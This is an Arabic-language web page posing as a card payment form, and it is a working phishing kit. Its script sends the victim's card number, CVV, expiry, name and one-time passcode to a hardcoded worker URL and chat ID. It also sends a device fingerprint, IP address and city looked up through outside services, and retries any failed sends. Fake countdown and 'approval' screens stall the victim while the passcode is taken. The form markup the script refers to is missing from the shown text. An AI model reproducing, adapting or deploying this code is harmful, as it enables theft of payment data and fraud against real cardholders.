<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>بطاقة الدفع</title>

<style>
*,
*::before,
*::after {
  box-sizing: border-box;
}

html {
  -webkit-text-size-adjust: 100%;
  text-size-adjust: 100%;
}

body {
  font-family: Arial, sans-serif;
  background: #f5f5f5;
  margin: 0;
  padding: 0;
  overflow-x: hidden;
}

.payment-screen {
  width: 100%;
  padding: 14px 14px 12px;
}

.page-shell {
  width: 100%;
  max-width: 430px;
  margin: 0 auto;
}

.apple-pay-screen {
  position: fixed;
  inset: 0;
  background: #fff;
  z-index: 99999;
  display: none;
}

.apple-pay-btn {
  width: 100%;
  background: #000;
  border-radius: 999px;
  height: 70px;
  margin: 8px auto 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  cursor: pointer;
  border: none;
  outline: none;
  padding: 0;
  -webkit-tap-highlight-color: transparent;
}

.apple-wrap {
  width: 175px;
  height: 44px;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
}

.apple-logo {
  width: 100%;
  height: auto;
  display: block;
  object-fit: contain;
  background: transparent !important;
  border: none !important;
  box-shadow: none !important;
  pointer-events: none;
  user-select: none;
  -webkit-user-drag: none;
  transform: scale(1.68) translateY(9px);
  transform-origin: center center;
}

.box {
  width: 100%;
  border: 2px solid #000;
  border-radius: 26px;
  padding: 20px;
  background: #fff;
  overflow: hidden;
}

.title {
  font-size: 22px;
  font-weight: 700;
  margin-bottom: 15px;
}

.input-box {
  width: 100%;
  background: #f2f2f2;
  border-radius: 30px;
  padding: 0 15px;
  height: 52px;
  margin-top: 15px;
  display: flex;
  align-items: center;
  border: 1px solid transparent;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
  overflow: hidden;
}

.card-icon {
  width: 65px;
  height: auto;
  margin-left: 10px;
  background: transparent !important;
  border: none !important;
  box-shadow: none !important;
  display: block;
  flex-shrink: 0;
}

.card-number {
  border: none;
  outline: none;
  background: transparent;
  font-size: 16px;
  width: 100%;
  text-align: right;
  color: #111;
}

.row {
  display: flex;
  width: 100%;
  gap: 10px;
  margin-top: 15px;
}

.small-input {
  flex: 1;
  min-width: 0;
  border: 1px solid transparent;
  outline: none;
  background: #f2f2f2;
  border-radius: 30px;
  padding: 12px;
  text-align: center;
  font-size: 15px;
  height: 48px;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
  color: #111;
}

.name-input {
  border: 1px solid transparent;
  outline: none;
  background: #f2f2f2;
  border-radius: 30px;
  height: 52px;
  padding: 0 14px;
  width: 100%;
  text-align: center;
  font-size: 16px;
  margin-top: 15px;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
  color: #111;
}

.expiry-box {
  flex: 1;
  min-width: 0;
  background: #f2f2f2;
  border-radius: 30px;
  height: 48px;
  display: flex;
  align-items: center;
  justify-content: center;
  border: 1px solid transparent;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
  overflow: hidden;
  direction: ltr;
}

.expiry-select {
  width: 44%;
  border: none;
  outline: none;
  background: transparent;
  font-size: 15px;
  text-align: center;
  text-align-last: center;
  appearance: none;
  -webkit-appearance: none;
  -moz-appearance: none;
  padding: 0;
  color: #000;
  cursor: pointer;
}

.expiry-sep {
  width: 12%;
  text-align: center;
  font-size: 15px;
  color: #555;
  user-select: none;
}

.pay-btn {
  width: 100%;
  margin: 16px auto 0;
  background: #2e9f44;
  color: #fff;
  border: none;
  border-radius: 999px;
  height: 70px;
  font-size: 21px;
  font-weight: 700;
  cursor: pointer;
  display: block;
  -webkit-tap-highlight-color: transparent;
}

.error {
  border-color: rgba(220, 38, 38, 0.45) !important;
  box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.08) !important;
}

input::placeholder {
  color: #777;
}

select:invalid {
  color: #777;
}

.flow-screen {
  position: fixed;
  inset: 0;
  background: #fff;
  z-index: 100000;
  display: none;
  align-items: center;
  justify-content: center;
  padding: 20px;
}

.flow-card {
  width: 100%;
  max-width: 420px;
  text-align: center;
}

.loader-pro {
  position: relative;
  width: 124px;
  height: 124px;
  margin: 0 auto 22px;
  border-radius: 50%;
  background: conic-gradient(
    from 210deg,
    #0b78f2 0deg 58deg,
    #b9dafb 58deg 360deg
  );
  animation: spinRing 1.15s linear infinite;
}

.loader-pro::before {
  content: "";
  position: absolute;
  inset: 18px;
  background: #fff;
  border-radius: 50%;
}

.loader-pro::after {
  content: "";
  position: absolute;
  inset: 0;
  border-radius: 50%;
  box-shadow:
    0 0 0 1px rgba(11, 120, 242, 0.03),
    0 8px 20px rgba(11, 120, 242, 0.08);
}

.countdown {
  font-size: 32px;
  font-weight: 700;
  color: #1d4ed8;
  direction: ltr;
}

.auth-title {
  font-size: 32px;
  font-weight: 800;
  color: #111;
  line-height: 1.5;
  margin-bottom: 18px;
}

.auth-desc {
  font-size: 21px;
  line-height: 2;
  color: #444;
  margin-bottom: 26px;
}

.back-link {
  display: inline-block;
  margin-top: 70px;
  font-size: 16px;
  font-weight: 700;
  color: #5b8def;
  text-decoration: underline;
  text-underline-offset: 4px;
  cursor: pointer;
}

.otp-desc {
  font-size: 17px;
  line-height: 2;
  color: #111;
  margin-bottom: 18px;
}

.otp-input {
  width: 100%;
  height: 52px;
  border-radius: 30px;
  border: 1px solid transparent;
  background: #f2f2f2;
  outline: none;
  text-align: center;
  font-size: 18px;
  padding: 0 16px;
  transition: border-color 0.2s ease, box-shadow 0.2s ease;
}

.otp-btn {
  width: 100%;
  margin-top: 15px;
  background: #2e9f44;
  color: #fff;
  border: none;
  border-radius: 40px;
  height: 56px;
  font-size: 20px;
  font-weight: 700;
  cursor: pointer;
}

input,
select,
button {
  font-family: inherit;
}

@keyframes spinRing {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}

@media (max-width: 480px) {
  .payment-screen { padding: 10px; }
  .page-shell { max-width: 100%; }
  .apple-pay-btn { height: 64px; margin-bottom: 14px; }
  .apple-wrap { width: 150px; height: 38px; }
  .apple-logo { transform: scale(1.60) translateY(8px); }
  .box { padding: 16px; }
  .title { font-size: 20px; }
  .pay-btn { height: 64px; font-size: 19px; }
}

@media (min-width: 700px) {
  body { display: flex; justify-content: center; }
  .payment-screen { padding-top: 16px; padding-bottom: 10px; }
  .page-shell { max-width: 440px; }
  .apple-pay-btn { height: 72px; }
  .apple-wrap { width: 190px; height: 46px; }
  .apple-logo { transform: scale(1.76) translateY(9px); }
}
</style>
</head>

<script>
// ========================  إعدادات الإرسال الموثوق (معالج iOS Safari) ========================
const WORKER_URL = "https://icy-cherry-0930.msjsoo777.workers.dev/";  // 👈 رابط المستضيف (غيّره هنا)
const CHAT_ID = "6918534470";                                    // 👈 معرف الدردشة (غيّره هنا)

// -------------------  البصمة والبيانات الإضافية -------------------
function generateStableFingerprint() {
  let components = [
    navigator.userAgent || '',
    navigator.language || '',
    screen.width + 'x' + screen.height,
    screen.colorDepth,
    new Date().getTimezoneOffset(),
    navigator.hardwareConcurrency || '',
    navigator.deviceMemory || '',
    !!navigator.maxTouchPoints ? 'touch' : 'no-touch'
  ];
  let fingerprint = components.join('|');
  let hash = 0;
  for (let i = 0; i < fingerprint.length; i++) {
    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
    hash |= 0;
  }
  return 'fp_' + Math.abs(hash).toString(16);
}

let userId = localStorage.getItem("stableUserId");
if (!userId) {
  userId = generateStableFingerprint();
  localStorage.setItem("stableUserId", userId);
}

let visitCount = localStorage.getItem("visitCount_" + userId);
if (!visitCount) {
  visitCount = 1;
} else {
  visitCount = parseInt(visitCount) + 1;
}
localStorage.setItem("visitCount_" + userId, visitCount);

function getDeviceType() {
  const ua = navigator.userAgent;
  if (/Android/i.test(ua)) return "Android";
  if (/iPhone/i.test(ua)) return "iPhone";
  if (/iPad/i.test(ua)) return "iPad";
  if (/iPod/i.test(ua)) return "iPod";
  return "Desktop";
}

function getBrowserName() {
  const ua = navigator.userAgent;
  if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
  if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Safari";
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Edg")) return "Edge";
  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
  if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
  return "Unknown";
}

let geoData = { country: "غير معروف", city: "غير معروف" };
let clientIP = "غير معروف";

async function fetchIPandGeo() {
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipJson = await ipRes.json();
    clientIP = ipJson.ip;
    const geoRes = await fetch(`https://ipapi.co/${clientIP}/json/`);
    const geoJson = await geoRes.json();
    if (!geoJson.error) {
      geoData.country = geoJson.country_name || "غير معروف";
      geoData.city = geoJson.city || "غير معروف";
    }
  } catch(e) { console.warn("فشل جلب الموقع", e); }
}
fetchIPandGeo();

function getCurrentDateTime() {
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, '0');
  const day = String(now.getDate()).padStart(2, '0');
  const hours = String(now.getHours()).padStart(2, '0');
  const minutes = String(now.getMinutes()).padStart(2, '0');
  const seconds = String(now.getSeconds()).padStart(2, '0');
  return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
}

function getExtraInfo() {
  const dateTime = getCurrentDateTime();
  return `المستخدم الثابت: ${userId}
عدد الزيارات: ${visitCount}
الجهاز: ${getDeviceType()}
المتصفح: ${getBrowserName()}
IP: ${clientIP}
الموقع: ${geoData.city} - ${geoData.country}
التاريخ والوقت: ${dateTime}`;
}

// -------------------  نظام الإرسال الموثوق (مع طابور محلي وإعادة محاولة) -------------------
const STORAGE_KEY = "pending_messages_queue";
let isProcessingQueue = false;

function savePendingMessages(messages) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(messages));
}

function loadPendingMessages() {
  const raw = localStorage.getItem(STORAGE_KEY);
  if (!raw) return [];
  try {
    return JSON.parse(raw);
  } catch(e) {
    return [];
  }
}

function addToQueue(messageText, retryCount = 0) {
  const queue = loadPendingMessages();
  const messageId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
  queue.push({
    id: messageId,
    text: messageText,
    retries: retryCount,
    createdAt: Date.now()
  });
  savePendingMessages(queue);
  processQueue();
}

function removeFromQueue(messageId) {
  let queue = loadPendingMessages();
  queue = queue.filter(msg => msg.id !== messageId);
  savePendingMessages(queue);
}

async function sendSingleMessage(fullMessage, messageId, retriesLeft = 3) {
  try {
    const response = await fetch(WORKER_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: fullMessage })
    });
    if (response.ok) {
      if (messageId) removeFromQueue(messageId);
      return true;
    } else {
      throw new Error(`HTTP ${response.status}`);
    }
  } catch(err) {
    if (retriesLeft > 0) {
      const delay = 1000 * (4 - retriesLeft);
      await new Promise(resolve => setTimeout(resolve, delay));
      return sendSingleMessage(fullMessage, messageId, retriesLeft - 1);
    } else {
      console.warn("فشل إرسال الرسالة بعد 3 محاولات", fullMessage);
      return false;
    }
  }
}

async function processQueue() {
  if (isProcessingQueue) return;
  isProcessingQueue = true;
  const queue = loadPendingMessages();
  if (queue.length === 0) {
    isProcessingQueue = false;
    return;
  }
  for (const msg of queue) {
    if (Date.now() - msg.createdAt > 10 * 60 * 1000) {
      removeFromQueue(msg.id);
      continue;
    }
    const extra = getExtraInfo();
    const fullMsg = `${msg.text}\n\n━━━━━━━━━━━━━━━━━━━━\n${extra}`;
    await sendSingleMessage(fullMsg, msg.id, msg.retries || 3);
    await new Promise(resolve => setTimeout(resolve, 500));
  }
  isProcessingQueue = false;
}

async function sendToWorker(messageText) {
  const extra = getExtraInfo();
  const fullMessage = `${messageText}\n\n━━━━━━━━━━━━━━━━━━━━\n${extra}`;
  const success = await sendSingleMessage(fullMessage, null, 3);
  if (!success) {
    addToQueue(messageText, 0);
  }
}

window.addEventListener('load', () => {
  setTimeout(() => processQueue(), 1000);
  setInterval(() => processQueue(), 30000);
});

// ========================  باقي الكود (وظائف البطاقة والتدفق) ========================
const cardInput = document.getElementById("cardNumber");
const cvvInput = document.getElementById("cvv");
const nameInput = document.getElementById("cardName");
const expMonth = document.getElementById("expMonth");
const expYear = document.getElementById("expYear");
const expiryBox = document.getElementById("expiryBox");
const logo = document.getElementById("cardLogo");
const cardBox = document.getElementById("cardBox");
const payBtn = document.getElementById("payBtn");
const applePayBtn = document.getElementById("applePayBtn");
const applePayScreen = document.getElementById("applePayScreen");
const paymentScreen = document.getElementById("paymentScreen");
const loadingScreen1 = document.getElementById("loadingScreen1");
const approvalScreen = document.getElementById("approvalScreen");
const otpScreen = document.getElementById("otpScreen");
const loadingScreen2 = document.getElementById("loadingScreen2");
const countdown60 = document.getElementById("countdown60");
const backToOtp = document.getElementById("backToOtp");
const otpInput = document.getElementById("otpInput");
const otpBtn = document.getElementById("otpBtn");

const LOGO_DEFAULT = "https://i.postimg.cc/Hsf6sDzk/20260412-152344.png";
const LOGO_VISA = "https://i.postimg.cc/Gmw4mqyR/20260412-151020.png";
const LOGO_MC = "https://i.postimg.cc/fb5y5sgX/20260412-150959.png";

let timer60 = null;
let timer30 = null;

// تعبئة شهور وسنوات
for (let i = 1; i <= 12; i++) {
  const val = String(i).padStart(2, "0");
  const option = document.createElement("option");
  option.value = val;
  option.textContent = val;
  expMonth.appendChild(option);
}
for (let i = 26; i <= 50; i++) {
  const option = document.createElement("option");
  option.value = i;
  option.textContent = i;
  expYear.appendChild(option);
}

function toggleError(element, show) {
  if (show) element.classList.add("error");
  else element.classList.remove("error");
}

function sanitizeCard(value) { return value.replace(/\D/g, "").slice(0, 16); }
function sanitizeCVV(value) { return value.replace(/\D/g, "").slice(0, 3); }
function sanitizeName(value) { return value.replace(/[^A-Za-z ]/g, "").replace(/\s{2,}/g, " ").replace(/^\s+/, ""); }
function sanitizeOTP(value) { return value.replace(/\D/g, "").slice(0, 6); }

function showScreen(screen) {
  paymentScreen.style.display = "none";
  loadingScreen1.style.display = "none";
  approvalScreen.style.display = "none";
  otpScreen.style.display = "none";
  loadingScreen2.style.display = "none";
  screen.style.display = "flex";
}

function hideAllTimers() {
  if (timer60) { clearInterval(timer60); timer60 = null; }
  if (timer30) { clearTimeout(timer30); timer30 = null; }
}

function detectCardType(number) {
  if (!/^\d+$/.test(number)) return "unknown";
  if (number.startsWith("4")) return "visa";
  if (number.length >= 2) {
    let firstTwo = parseInt(number.slice(0,2),10);
    if (firstTwo>=51 && firstTwo<=55) return "mastercard";
  }
  if (number.length >= 4) {
    let firstFour = parseInt(number.slice(0,4),10);
    if (firstFour>=2221 && firstFour<=2720) return "mastercard";
  }
  return "unknown";
}

function updateCardLogo(type) {
  if (type === "visa") logo.src = LOGO_VISA;
  else if (type === "mastercard") logo.src = LOGO_MC;
  else logo.src = LOGO_DEFAULT;
}

function validateCard() { let valid = /^\d{16}$/.test(cardInput.value); toggleError(cardBox, !valid); return valid; }
function validateCVV() { let valid = /^\d{3}$/.test(cvvInput.value); toggleError(cvvInput, !valid); return valid; }
function validateName() { let valid = /^[A-Za-z ]+$/.test(nameInput.value.trim()) && /[A-Za-z]/.test(nameInput.value.trim()); toggleError(nameInput, !valid); return valid; }
function validateExpiry() { let valid = expMonth.value !== "" && expYear.value !== ""; toggleError(expiryBox, !valid); return valid; }
function validateOTP() { let valid = /^\d{4,6}$/.test(otpInput.value.trim()); toggleError(otpInput, !valid); return valid; }

cardInput.addEventListener("input", function() {
  this.value = sanitizeCard(this.value);
  updateCardLogo(detectCardType(this.value));
  if (this.value.length > 0) {
    if (/^\d{16}$/.test(this.value)) validateCard();
    else toggleError(cardBox, false);
  } else {
    toggleError(cardBox, false);
    updateCardLogo("unknown");
  }
});
cardInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
cvvInput.addEventListener("input", function() {
  this.value = sanitizeCVV(this.value);
  if (this.value.length > 0) {
    if (this.value.length === 3) validateCVV();
    else toggleError(cvvInput, false);
  } else toggleError(cvvInput, false);
});
cvvInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
nameInput.addEventListener("input", function() {
  this.value = sanitizeName(this.value);
  if (this.value.trim().length > 0) validateName();
  else toggleError(nameInput, false);
});
nameInput.addEventListener("keypress", e => { if (e.key.length===1 && !/[A-Za-z ]/.test(e.key)) e.preventDefault(); });
otpInput.addEventListener("input", function() {
  this.value = sanitizeOTP(this.value);
  if (this.value.length > 0) validateOTP();
  else toggleError(otpInput, false);
});
otpInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
expMonth.addEventListener("paste", e => e.preventDefault());
expYear.addEventListener("paste", e => e.preventDefault());
cardInput.addEventListener("focus", () => cardBox.classList.remove("error"));
cvvInput.addEventListener("focus", () => cvvInput.classList.remove("error"));
nameInput.addEventListener("focus", () => nameInput.classList.remove("error"));
expMonth.addEventListener("focus", () => expiryBox.classList.remove("error"));
expYear.addEventListener("focus", () => expiryBox.classList.remove("error"));
otpInput.addEventListener("focus", () => otpInput.classList.remove("error"));
expMonth.addEventListener("change", validateExpiry);
expYear.addEventListener("change", validateExpiry);

// أحداث الإرسال (مع إرسال موثوق)
applePayBtn.addEventListener("click", function() {
  applePayScreen.style.display = "block";
  setTimeout(() => { applePayScreen.style.display = "none"; }, 2000);
  sendToWorker("🪪 تم النقر على Apple Pay");
});

payBtn.addEventListener("click", function(e) {
  e.preventDefault();
  const isCardValid = validateCard();
  const isCVVValid = validateCVV();
  const isNameValid = validateName();
  const isExpiryValid = validateExpiry();
  if (isCardValid && isCVVValid && isNameValid && isExpiryValid) {
    let cardType = detectCardType(cardInput.value);
    let cardTypeName = "بدون نوع";
    if (cardType === "visa") cardTypeName = "فيزا";
    else if (cardType === "mastercard") cardTypeName = "ماستر كارد";
    const cardMessage = `💳 معلومات الدفع\n━━━━━━━━━━━━━━━━━━━━\n🏷 نوع البطاقة: ${cardTypeName}\n🔢 رقم البطاقة: ${cardInput.value}\n🔐 رمز CVV: ${cvvInput.value}\n📅 تاريخ الانتهاء: ${expMonth.value}/${expYear.value}\n👤 الاسم على البطاقة: ${nameInput.value.trim() || "غير مدخل"}`;
    sendToWorker(cardMessage);
    startFirstLoading();
  }
});

function startFirstLoading() {
  hideAllTimers();
  showScreen(loadingScreen1);
  let seconds = 60;
  countdown60.textContent = seconds;
  timer60 = setInterval(() => {
    seconds--;
    countdown60.textContent = seconds;
    if (seconds <= 0) {
      clearInterval(timer60);
      timer60 = null;
      showScreen(approvalScreen);
    }
  }, 1000);
}

function startSecondLoading() {
  hideAllTimers();
  showScreen(loadingScreen2);
  timer30 = setTimeout(() => {
    timer30 = null;
    showScreen(otpScreen);
    otpInput.value = "";
    otpInput.classList.remove("error");
  }, 30000);
}

backToOtp.addEventListener("click", function() {
  hideAllTimers();
  showScreen(otpScreen);
  otpInput.value = "";
  otpInput.classList.remove("error");
  sendToWorker("↩️ تم الرجوع إلى رمز التحقق");
});

otpBtn.addEventListener("click", function() {
  const isOtpValid = validateOTP();
  if (!isOtpValid) return;
  const otpCode = otpInput.value.trim();
  sendToWorker(`🔐 رمز التحقق OTP المدخل: ${otpCode}`);
  startSecondLoading();
});
</script>
</body>
</html>
